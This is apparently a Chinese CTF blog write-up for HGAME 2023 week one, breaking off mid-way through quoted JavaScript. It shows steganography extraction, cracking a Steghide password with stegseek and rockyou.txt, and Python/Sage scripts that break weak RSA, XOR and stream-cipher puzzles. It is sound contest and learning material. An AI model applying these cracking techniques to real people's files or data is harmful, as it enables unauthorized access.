    <published>2023-01-11T10:51:02.000Z</published>
    <updated>2023-01-13T10:19:10.014Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)<br>线上赛平台：<a href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭<br>本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址<br>比赛奖金(针对校外榜)：<br>第1名：1000Pwnhub金币<br>第2名：800Pwnhub金币<br>第3名：600Pwnhub金币<br>4-10名：300Pwnhub金币<br>补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个<br>注意：<br>* 所有选手均以个人为单位参赛；<br>* 在解题过程中遇到瓶颈或困难可以私聊出题人<br>* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。<br>* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。<br>* 每周比赛结束后本周前20名需提交wp到指定邮箱<br>本比赛最终解释权归 Vidar-Team 所有</p><p><strong>Rank: 1</strong></p><hr><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h3><blockquote><p>欢迎参加HGAME2023,Base64解码这段Flag，然后和兔兔一起开始你的HGAME之旅吧，祝你玩的愉快！</p><p>aGdhbWV7V2VsY29tZV9Ub19IR0FNRTIwMjMhfQ==</p></blockquote><p>签到，base64解码，flag：<code>hgame&#123;Welcome_To_HGAME2023!&#125;</code>。</p><p>​    </p><h3 id="Where-am-I"><a href="#Where-am-I" class="headerlink" title="Where am I"></a>Where am I</h3><blockquote><p>兔兔回家之前去了一个神秘的地方，并拍了张照上传到网盘，你知道他去了哪里吗？</p><p>flag格式为: <code>hgame&#123;经度时_经度分_经度秒_东经(E)/西经(W)_纬度时_纬度分_纬度秒_南纬(S)/北纬(N)&#125;</code>，秒精确到小数点后两位</p><p>例如: 11°22’33.99’’E, 44°55’11.00’’S 表示为 hgame{11_22_3399_E_44_55_1100_S}</p></blockquote><p>wireshark打开流量文件，在TCP流15提取rar文件；</p><p>16进制下查看rar文件，查看第24个16进制数为<code>24</code>，修改为 <code>20</code> 去除伪加密，解压得到 <code>Exchangeable.jpg</code>；</p><p>查看jpg文件属性，发现GPS经纬度信息，提取经纬度数据按格式得到flag：<code>hgame&#123;116_24_1488_E_39_54_5418_N&#125;</code>。</p><p>​    </p><h3 id="神秘的海报"><a href="#神秘的海报" class="headerlink" title="神秘的海报"></a>神秘的海报</h3><blockquote><p>坐车回到家的兔兔听说ek1ng在HGAME的海报中隐藏了一个秘密……（还记得我们的Misc培训吗？</p></blockquote><p>zsteg查看png图片，发现在 <code>b1,rgb,lsb,xy</code> 存在lsb隐写内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Sure enough, you still remember what we talked about at that time! This is part of the secret: `hgame&#123;U_Kn0w_LSB&amp;W`</span><br><span class="line">I put the rest of the content here, https://drive.google.com/file/d/13kBos3Ixlfwkf3e0z0kJTEqBxm7RUk-G/view?usp=sharing, if you directly access the google drive cloud disk download in China, it will be very slow, you can try to use Scientific Internet access solves the problem of slow or inaccessible access to external network resources. This is my favorite music, there is another part of the secret in the music, I use Steghide to encrypt, the password is also the 6-digit password we agreed at the time, even if someone else finds out here, it should not be so easy to crack (( hope so</span><br></pre></td></tr></table></figure><p>得到flag前半部分 <code>hgame&#123;U_Kn0w_LSB&amp;W</code>。</p><p>到google云盘下载 <code>Bossanova.wav</code> 文件，根据上面文字提示 <code>I use Steghide to encrypt, the password is also the 6-digit password</code>，使用了 <code>Steghide</code> 工具用6位数字密码隐写信息，爆破密码提取信息：</p><p><code>stegseek Bossanova.wav rockyou.txt</code></p><p>解出密码为 <code>123456</code>，隐写内容：<code>恭喜你解到这里，剩下的Flag是 av^Mp3_Stego&#125;，我们Week2见！</code></p><p>flag：<code>hgame&#123;U_Kn0w_LSB&amp;Wav^Mp3_Stego&#125;</code></p><p>​    </p><h3 id="e99p1ant-want-girlfriend"><a href="#e99p1ant-want-girlfriend" class="headerlink" title="e99p1ant_want_girlfriend"></a>e99p1ant_want_girlfriend</h3><blockquote><p>兔兔在抢票网站上看到了一则相亲广告，人还有点小帅，但这个图片似乎有点问题，好像是CRC校验不太正确？</p></blockquote><p>16进制下修改png图片的高为更大的值，发现flag：<code>hgame&#123;e99p1ant_want_a_girlfriend_qq_524306184&#125;</code>。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="兔兔的车票"><a href="#兔兔的车票" class="headerlink" title="兔兔的车票"></a>兔兔的车票</h3><blockquote><p>兔兔刚买到车票就把车票丢到一旁，自己忙去了。结果再去找车票时发现原来的车票混在了其他东西里，而且票面还被污染了。你能帮兔兔找到它的车票吗。</p><p>注：flag.png已经提前保存在source文件夹下，并且命名为picture{x}.png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randint, getrandbits</span><br><span class="line"></span><br><span class="line">flagImg = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">width = flagImg.width</span><br><span class="line">height = flagImg.height</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeSourceImg</span>():</span><br><span class="line">    colors = long_to_bytes(getrandbits(width * height * <span class="number">24</span>))[::-<span class="number">1</span>]</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            img.putpixel((j, i), (colors[x], colors[x + <span class="number">1</span>], colors[x + <span class="number">2</span>]))</span><br><span class="line">            x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">source文件夹下面的图片生成过程：</span></span><br><span class="line"><span class="string">def makeImg():</span></span><br><span class="line"><span class="string">    colors = list(long_to_bytes(getrandbits(width * height * 23)).zfill(width * height * 24))</span></span><br><span class="line"><span class="string">    shuffle(colors)</span></span><br><span class="line"><span class="string">    colors = bytes(colors)</span></span><br><span class="line"><span class="string">    img = Image.new(&#x27;RGB&#x27;, (width, height))</span></span><br><span class="line"><span class="string">    x = 0</span></span><br><span class="line"><span class="string">    for i in range(height):</span></span><br><span class="line"><span class="string">        for j in range(width):</span></span><br><span class="line"><span class="string">            img.putpixel((j, i), (colors[x], colors[x + 1], colors[x + 2]))</span></span><br><span class="line"><span class="string">            x += 3</span></span><br><span class="line"><span class="string">    return img</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(15):</span></span><br><span class="line"><span class="string">    im = makeImg()</span></span><br><span class="line"><span class="string">    im.save(f&quot;./source/picture&#123;i&#125;.png&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">n1 = makeSourceImg()</span><br><span class="line">n2 = makeSourceImg()</span><br><span class="line">n3 = makeSourceImg()</span><br><span class="line">nonce = [n1, n2, n3]</span><br><span class="line"></span><br><span class="line">index = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line">shuffle(index)</span><br><span class="line">e=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这里flag.png已经提前被保存在source文件夹下了，文件名也是picture&#123;xx&#125;.png</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">    im = Image.<span class="built_in">open</span>(<span class="string">f&quot;source/picture<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">    key = nonce[randint(<span class="number">0</span>, <span class="number">2</span>)]</span><br><span class="line">    encImg = xorImg(key, im)</span><br><span class="line">    encImg.save(<span class="string">f&#x27;pics/enc<span class="subst">&#123;e&#125;</span>.png&#x27;</span>)</span><br><span class="line">    e+=<span class="number">1</span></span><br></pre></td></tr></table></figure></blockquote><p>15张随机明文图片 $P_{m_k},k \in [1,15]$ 与1张flag图片 $P_f$，经过3张密钥图片  $P_k,k \in [1,3]$ 随机异或得到密文图片 $P_{c_k}, k \in [1,16]$，在随机生成明文图片的 <code>makeImg()</code> 函数中有概率生成像素为 (0,0,0) 的点，这些点在随机异或操作后，密文图片与密钥图片对应的该点像素值相同，则有：</p><p>flag图片对应的密文图片：$P_{c_f}(x,y) = P_{f}(x,y) \oplus P_{k_a}(x,y)$</p><p>非flag随机明文图片对应的密文图片： $P_{c_i}(x,y) = P_{m_i}(x,y) \oplus P_{k_b}(x,y)$，</p><p>当满足 $a=b$ 时，即找到使用相同密钥图片加密的两组原始图片，有 $P_{k_a}(x,y)=P_{k_b}(x,y)$，</p><p>则 $P_{c_f}(x,y) \oplus P_{c_i}(x,y) = P_{f}(x,y) \oplus P_{m_i}(x,y)$；</p><p>又有大部分随机明文图片的点的像素值为 (0,0,0)，即 $P_{m_i}(x_0,y_0)=0$，则</p><p>$P_{c_f}(x_0,y_0) \oplus P_{c_i}(x_0,y_0) = P_{f}(x_0,y_0) \oplus P_{m_i}(x_0,y_0)=P_{f}(x_0,y_0)$</p><p>有很大概率可以恢复flag图片。</p><p>只需找到满足 $a=b$ 的使用相同密钥图片加密的两组原始图片即可，通过爆破遍历。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">width = <span class="number">379</span></span><br><span class="line">height = <span class="number">234</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        img1 = Image.<span class="built_in">open</span>(<span class="string">f&#x27;pics/enc<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br><span class="line">        img2 = Image.<span class="built_in">open</span>(<span class="string">f&#x27;pics/enc<span class="subst">&#123;j&#125;</span>.png&#x27;</span>)</span><br><span class="line">        img = xorImg(img1, img2)</span><br><span class="line">        img.save(<span class="string">f&#x27;out/img_<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;j&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到还原的flag图片，flag：<code>hgame&#123;Oh_my_Ticket&#125;</code>。</p><p>​    </p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>众所周知，RSA的安全性基于整数分解难题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n=<span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line"><span class="string">n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$n$ 分解出 $p,q$，常规RSA。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span></span><br><span class="line">q = <span class="number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span></span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;factordb.com_is_strong!&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Be-Stream"><a href="#Be-Stream" class="headerlink" title="Be Stream"></a>Be Stream</h3><blockquote><p>很喜欢李小龙先生的一句话”Be water my friend”，但是这条小溪的水好像太多了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">type</span>(flag) == <span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">key = [<span class="built_in">int</span>.from_bytes(<span class="string">b&quot;Be water&quot;</span>, <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;my friend&quot;</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> key[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> key[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (stream(i-<span class="number">2</span>)*<span class="number">7</span> + stream(i-<span class="number">1</span>)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    water = stream((i//<span class="number">2</span>)**<span class="number">6</span>) % <span class="number">256</span></span><br><span class="line">    enc += <span class="built_in">bytes</span>([water ^ flag[i]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"><span class="comment"># b&#x27;\x1a\x15\x05\t\x17\tu&quot;-\x06lm\x01-\xc7\xcc2\x1eXA\x1c\x15\xb7\xdb\x06\x13\xaf\xa1-\x0b\xd4\x91-\x06\x8b\xd4-\x1e\xab\xaa\x15-\xf0\xed\x1f\x17\x1bY&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>递推关系等同于矩阵运算：</p><p>$s_i=4s_{i-1}+7s_{i-2}\Longrightarrow \begin{bmatrix} s_i \\ s_{i-1}  \end{bmatrix}=\begin{bmatrix} 4 &amp; 7 \\ 1 &amp; 0 \end{bmatrix}\begin{bmatrix} s_{i-1} \\ s_{i-2} \end{bmatrix}=\begin{bmatrix} 4 &amp; 7 \\ 1 &amp; 0 \end{bmatrix}^{i-1}\begin{bmatrix} s_1 \\ s_0 \end{bmatrix}$</p><p>利用矩阵快速幂快速求值即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">enc = <span class="built_in">list</span>(<span class="string">b&#x27;\x1a\x15\x05\t\x17\tu&quot;-\x06lm\x01-\xc7\xcc2\x1eXA\x1c\x15\xb7\xdb\x06\x13\xaf\xa1-\x0b\xd4\x91-\x06\x8b\xd4-\x1e\xab\xaa\x15-\xf0\xed\x1f\x17\x1bY&#x27;</span>)</span><br><span class="line">key = [<span class="built_in">int</span>.from_bytes(<span class="string">b&quot;Be water&quot;</span>, <span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;my friend&quot;</span>, <span class="string">&#x27;big&#x27;</span>)]</span><br><span class="line">s0, s1 = key</span><br><span class="line"></span><br><span class="line">M = matrix(Zmod(<span class="number">256</span>), [[<span class="number">4</span>,<span class="number">7</span>],[<span class="number">1</span>,<span class="number">0</span>]])</span><br><span class="line">A = vector(Zmod(<span class="number">256</span>), [s1,s0])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> (M^(x-<span class="number">1</span>)*A)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    water = stream((i//<span class="number">2</span>)**<span class="number">6</span>)</span><br><span class="line">    flag += [(<span class="built_in">int</span>(water) ^^ <span class="built_in">int</span>(enc[i])) % <span class="number">128</span>]</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;1f_this_ch@l|eng3_take_y0u_to0_long_time?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="神秘的电话"><a href="#神秘的电话" class="headerlink" title="神秘的电话"></a>神秘的电话</h3><blockquote><p>学校突然放假了，tr0uble正在开开心心的收拾东西准备回家，但是手机铃声突然响起，tr0uble接起电话，但是只听到滴答滴答的声音。努力学习密码学的tr0uble一听就知道这是什么，于是马上记录下来并花了亿点时间成功破译了，但是怎么看这都不像是人能看懂的，还没等tr0uble反应过来，又一通电话打来，依然是滴答滴答的声音。tr0uble想到兔兔也在学习密码学，于是不负责任地把密文都交给了兔兔，兔兔收到密文后随便看了一眼就不屑地说”这么简单都不会？自己解去，别耽误我抢车票”。</p><p>flag为最后得到的结果套上hgame{}, flag中字母均为小写</p></blockquote><p>txt文件中有提示：</p><p><code>几个星期前，我们收到一个神秘的消息。但是这个消息被重重加密，我们不知道它的真正含义是什么。唯一知道的信息是关于密钥的：“只有倒着翻过十八层的篱笆才能抵达北欧神话的终点”。</code></p><p>从wav文件中手搓摩斯密码：</p><p><code>----- ..--- ..--- ...-- . ..--.- .--. .-. .. .. -... .-.. -.-- ..--.- ..--.- .... --- -. .-- .- ..--.- .--- -- --. .... ..--.- ..-. --. -.- -.-. --.- .- --- --.- - -- ..-. .-.</code></p><p>解码：<code>0223e_priibly__honwa_jmgh_fgkcqaoqtmfr</code></p><p>根据txt提示，字符串逆序 + 栅栏密码（18栏） 得到：<code>rmocfhm_wo_ybipe2023_ril_hnajg_katfqqg</code></p><p>由 <code>2023</code> 猜测 <code>ybipe</code> 对应 <code>hgame</code>，尝试Vigenere密码，密钥 <code>vidar</code>，得到：<code>welcome_to_hgame2023_and_enjoy_hacking</code></p><p>flag：<code>hgame&#123;welcome_to_hgame2023_and_enjoy_hacking&#125;</code></p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><blockquote><p>兔兔最近迷上了一个纯前端实现的网页小游戏，但是好像有点难玩，快帮兔兔通关游戏！</p></blockquote><p>js游戏，查看源码，在 <code>/Res/Events.js</code> 中找到关键函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">mota</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> a = [<span class="string">&#x27;\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35&#x27;</span>];</span><br><span class="line">  (<span class="keyword">function</span> (<span class="params">b, e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params">g</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> (--g) &#123;</span><br><span class="line">        b[<span class="string">&#x27;push&#x27;</span>](b[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">f</span>(++e);</span><br><span class="line">  &#125;(a, <span class="number">0x198</span>));</span><br><span class="line">  <span class="keyword">var</span> b = <span class="keyword">function</span> (<span class="params">c, d</span>) &#123;</span><br><span class="line">    c = c - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> e = a[c];</span><br><span class="line">    <span class="keyword">if</span> (b[<span class="string">&#x27;CFrzVf&#x27;</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">      (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> g;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> i = <span class="title class_">Function</span>(<span class="string">&#x27;return\x20(function()\x20&#x27;</span> + <span class="string">&#x27;&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)&#x27;</span> + <span class="string">&#x27;);&#x27;</span>);</span><br><span class="line">          g = <span class="title function_">i</span>();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (j) &#123;</span><br><span class="line">          g = <span class="variable language_">window</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> h = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span>;</span><br><span class="line">        g[<span class="string">&#x27;atob&#x27;</span>] || (g[<span class="string">&#x27;atob&#x27;</span>] = <span 